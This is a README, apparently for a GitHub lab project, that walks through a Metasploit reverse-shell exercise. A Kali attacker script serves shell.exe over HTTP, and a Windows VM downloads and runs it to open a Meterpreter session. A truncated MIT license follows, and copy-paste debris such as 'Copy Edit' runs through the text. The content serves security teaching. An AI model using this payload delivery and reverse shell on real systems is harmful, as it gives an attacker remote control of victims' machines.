# Metasploit Reverse Shell Lab

A step-by-step reverse shell lab using Metasploit Framework, designed for educational purposes only in a virtual test environment (Kali + Windows 10 VM).

## 📁 Folder Structure

metasploit-reverse-shell-lab/
├── scripts/ # run_lab.sh automation script
├── payloads/ # Generated shell.exe (ignored in Git)
├── screenshots/ # Images of the shell session
├── docs/ # Report or markdown notes
├── .gitignore
├── README.md
└── LICENSE

bash
Copy
Edit

## ⚙️ How to Use

### 1. On Kali Linux (Attacker):

```bash
cd scripts
./run_lab.sh <KALI_IP> 4444
2. On Windows VM (Victim):
Open browser and go to:

arduino
Copy
Edit
http://<KALI_IP>:8000/shell.exe
Download and run the file to trigger a Meterpreter session.

✅ Expected Output
On Kali, you'll get:

nginx
Copy
Edit
meterpreter > sysinfo
⚠️ Disclaimer
This lab is for educational and ethical hacking in a controlled virtual environment only. Do not use this code against unauthorized systems.

yaml
Copy
Edit

---

### ✅ `LICENSE` (MIT License — Open Source Friendly)

```text
MIT License

Copyright (c) 2025 Aarya

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the “Software”), to deal
in the Software without restriction...

[you can paste full MIT license here from: https://choosealicense.com/licenses/mit/]
